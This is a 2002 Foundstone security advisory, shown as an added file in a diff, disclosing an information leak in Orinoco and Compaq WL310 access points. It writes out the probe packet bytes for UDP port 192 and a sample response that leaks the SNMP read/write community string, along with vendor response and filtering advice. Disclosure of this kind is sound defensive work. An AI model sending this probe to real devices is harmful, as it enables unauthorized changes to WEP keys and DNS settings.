@@ -1,0 +1,92 @@
+foundstone labs advisory - 080902-apil
+
+advisory name:information leakage in orinoco and compaq access points
+ release date:august 9th, 2002
+  application:orinoco residential gateway and compaq wl310
+    platforms:n/a
+     severity:the ability to display/modify configuration information
+      vendors:orinoco (http://www.orinocowireless.com) and
+                  compaq (http://www.compaq.com)
+      authors:marshall beddoe (marshall.beddoe@foundstone.com)
+                  tony bettini (tony.bettini@foundstone.com)
+cve candidate:can-2002-0812
+    reference:http://www.foundstone.com/advisories
+
+overview:
+
+an information leakage vulnerability exists in orinoco and compaq oem 
+access points, disclosing the unique snmp community string. as a result,
+
+an attacker can query the community string and gain the ability to
+change
+system configuration including wired equivalent privacy (wep) keys and 
+domain name service (dns) information.
+
+detailed description:
+
+the compaq wl310 is an oem orinoco residential gateway access point.
+both the compaq and orinoco access points use a unique identification
+number
+found on the bottom of the access point for configuration through
+their management client. this identification string is used as the
+default snmp read/write community string. the community strings appears
+to be unchangable, unique, and not easily guessable. by sending a
+specific packet to udp port 192, the access point will return
+information including the firmware version and the unique identification
+value. the packet returned includes the value of system.sysname.0, which
+in the case of the compaq wl310 and orinoco residential gateway,
+includes
+the unique identification value. the identification value can then be
+used as the snmp community string to view and modify the configuration.
+
+the probe packet:
+"\x01\x00\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+example probe response:
+01 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
+00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
+00 00 00 00 00 60 1d 20  2e 38 00 00 18 19 10 f8  | .....`. .8......
+4f 52 69 4e 4f 43 4f 20  52 47 2d 31 31 30 30 20  | orinoco rg-1100
+30 33 39 32 61 30 00 00  00 00 00 00 00 00 00 00  | 0392a0..........
+02 8f 24 02 52 47 2d 31  31 30 30 20 56 33 2e 38  | ..$.rg-1100 v3.8
+33 20 53 4e 2d 30 32 55  54 30 38 32 33 32 33 34  | 3 sn-02ut0823234
+32 20 56 00                                       | 2 v.
+
+system.sysname.0 = "orinoco rg-1100 0392a0"
+community name: 0392a0
+
+vendor response:
+
+both vendors were notified of this issue on july 8th, 2002. according
+to orinoco, "the residential gateway line has been discontinued."
+
+solution:
+
+employ packet filtering on inbound requests to deny access to ports
+192/udp and 161/udp on the access point.
+
+foundscan has been updated to check for this vulnerability. for more
+information on foundscan, see the foundstone website:
+http://www.foundstone.com
+
+disclaimer:
+
+the information contained in this advisory is copyright (c) 2002 
+foundstone, inc. and is believed to be accurate at the time of 
+publishing, but no representation of any warranty is given, 
+express, or implied as to its accuracy or completeness. in no 
+event shall the author or foundstone be liable for any direct, 
+indirect, incidental, special, exemplary or consequential 
+damages resulting from the use or misuse of this information.  
+this advisory may be redistributed, provided that no fee is 
+assigned and that the advisory is not modified in any way.
+
+
+
